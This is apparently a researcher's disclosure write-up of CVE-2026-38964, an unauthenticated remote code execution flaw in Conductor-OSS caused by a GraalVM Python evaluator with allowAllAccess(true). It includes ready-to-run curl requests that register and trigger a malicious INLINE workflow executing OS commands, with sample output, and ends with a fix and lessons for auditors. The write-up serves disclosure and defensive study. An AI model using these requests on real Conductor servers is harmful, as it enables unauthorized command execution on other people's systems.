Zero Auth, allowAllAccess(true), and RCE in Conductor-OSS (CVE-2026-38964)

Prabhav Srinath | June 2026 | CVE-2026-38964 | CVSS 9.3 Critical

TL;DR

Conductor-OSS (Netflix's open-source workflow orchestration engine) ships a Python expression evaluator that initializes its GraalVM polyglot context with allowAllAccess(true). It wires this evaluator to an INLINE workflow task that takes arbitrary user expressions, and by default, exposes its workflow registration and execution REST controllers without any authentication. With two simple HTTP requests, an unauthenticated remote attacker gets full OS command execution as the Conductor server process, with command output returned directly in the synchronous HTTP response.

How I Got Here

I have a habit whenever I dive into a new open-source codebase: I run quick pattern scans for words that usually mean someone turned the safety off during development and forgot to turn it back on. 

grep -rn "allowAllAccess" .
grep -rn "setAccessible(true)" .
grep -rn "--no-sandbox" .

Conductor is serious enterprise software. Thousands of companies run core microservices and financial transaction pipelines on it. So when my grep hit inside a class literally named PythonEvaluator.java, I assumed there must be a robust upstream authentication filter or an enterprise API gateway guarding the gate.

There wasn't. What I found was a textbook chain of three separate architectural decisions that, when combined, gave the internet remote root on the cluster.

Source-to-Sink Anatomy

Let's trace how attacker-controlled data flows from the wire straight into GraalVM's unconstrained execution engine.

1. The Source: Unauthenticated Workflow Registration

In Conductor-OSS, MetadataResource.java exposes endpoints to register workflow definitions. Because authentication is disabled out-of-the-box in stock open-source deployments, any network client can POST a new workflow schema. 

// Workflow definition registering an INLINE python task
POST /api/metadata/workflow HTTP/1.1
Host: conductor.internal:8080
Content-Type: application/json

[
  {
    "name": "pwn_workflow",
    "tasks": [
      {
        "name": "eval_task",
        "type": "INLINE",
        "inputParameters": {
          "evaluatorType": "python",
          "expression": "import os; os.popen('id && uname -a').read()"
        }
      }
    ]
  }
]

2. The Intermediate: Inline Task Dispatcher

When the workflow is triggered via POST /api/workflow/execute/{name}/1, the execution engine passes the task to Inline.java, which looks up the registered evaluator from the internal map: 

// core/.../tasks/Inline.java
Evaluator evaluator = evaluators.get(evaluatorType); // returns PythonEvaluator
Object result = evaluator.evaluate(expression, inputParams);

3. The Sink: PythonEvaluator & allowAllAccess(true)

Here is the vulnerability in all its glory in PythonEvaluator.java: 

// core/src/main/java/.../evaluators/PythonEvaluator.java
try (Context context = Context.newBuilder("python")
        .allowAllAccess(true)  // ← EVERYTHING DISABLED: full filesystem, subprocess, JNI
        .build()) {
    Value pyFunction = context.eval("python", wrappedExpression);
    Value result = pyFunction.execute(inputParams);
    return result.asHostObject();
}

GraalVM's default security posture is deny-all. But allowAllAccess(true) grants the guest Python script permission to invoke import os, spawn child processes with subprocess.Popen, read/write host files, and even access host JVM reflection.

The synchronous execution endpoint returning command output in HTTP response

The Exploit: Two Curls to Full Shell

Because WorkflowResource supports synchronous execution (/api/workflow/execute), you don't even need an out-of-band reverse shell or DNS canary. The server hands you the standard output of your shell command right inside the JSON response payload.

Step 1: Register Malicious Workflow

curl -s -X POST 'http://target:8080/api/metadata/workflow' \
  -H 'Content-Type: application/json' \
  -d '[{
    "name": "rce_workflow",
    "version": 1,
    "tasks": [{
      "name": "rce_inline",
      "taskReferenceName": "rce_task",
      "type": "INLINE",
      "inputParameters": {
        "evaluatorType": "python",
        "expression": "import subprocess; return subprocess.check_output([\"id\"]).decode()"
      }
    }]
  }]'

Step 2: Trigger & Grab Output Synchronously

curl -s -X POST 'http://target:8080/api/workflow/execute/rce_workflow/1' \
  -H 'Content-Type: application/json' \
  -d '{}'

HTTP Response:

HTTP/1.1 200 OK
Content-Type: application/json

{
  "workflowId": "8f3b618a-49c0-4389-a3d2-28df0b76e279",
  "status": "COMPLETED",
  "output": {
    "result": "uid=1000(conductor) gid=1000(conductor) groups=1000(conductor)\n"
  }
}

The Fix

To properly remediate this vulnerability, Conductor-OSS must enforce capability-based GraalVM sandboxing configured with HostAccess.NONE, disabling native subprocess creation, I/O, and classloader access on untrusted evaluation contexts, paired with mandatory authentication filters on all workflow metadata and execution REST endpoints.

Takeaways for Vulnerability Researchers

Security bugs are rarely a single "wrong" line of code. They are usually three individually innocent decisions written years apart by different developers:

  1. Developer A adds an inline script evaluator for workflow power users.
  2. Developer B hits permission errors in GraalVM and slaps on allowAllAccess(true) to make tests pass.
  3. Developer C builds a clean REST API without default auth to ensure a smooth 30-second onboarding experience.

The bug lives in the seam where these three decisions meet. That's why full source-to-sink auditing remains the gold standard in vulnerability research.
